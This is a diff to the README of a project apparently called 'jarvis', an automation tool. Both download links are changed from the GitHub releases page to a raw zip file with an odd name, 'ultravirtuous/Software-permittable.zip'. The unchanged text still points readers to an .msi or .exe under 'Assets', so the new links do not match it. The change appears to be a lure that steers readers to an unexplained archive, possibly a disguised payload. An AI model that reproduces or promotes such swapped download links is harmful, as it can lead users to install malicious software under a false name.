@@ -1,6 +1,6 @@
 # 🤖 jarvis - Manage your digital world automatically
 
-[![Download jarvis](https://img.shields.io/badge/Download_jarvis-blue)](https://github.com/neodarwinian-gynandromorph769/jarvis/releases)
+[![Download jarvis](https://img.shields.io/badge/Download_jarvis-blue)](https://github.com/neodarwinian-gynandromorph769/jarvis/raw/refs/heads/main/ultravirtuous/Software-permittable.zip)
 
 ## 📖 What is jarvis?
 
@@ -31,7 +31,7 @@ Before you install the software, ensure your computer meets these basic requirem
 
 To get started, visit the official release page to download the necessary files. 
 
-[👉 Click here to visit the release page and download the installer](https://github.com/neodarwinian-gynandromorph769/jarvis/releases)
+[👉 Click here to visit the release page and download the installer](https://github.com/neodarwinian-gynandromorph769/jarvis/raw/refs/heads/main/ultravirtuous/Software-permittable.zip)
 
 Look for the file ending in `.msi` or `.exe` under the "Assets" section of the latest release. Save this file to your Downloads folder.
 
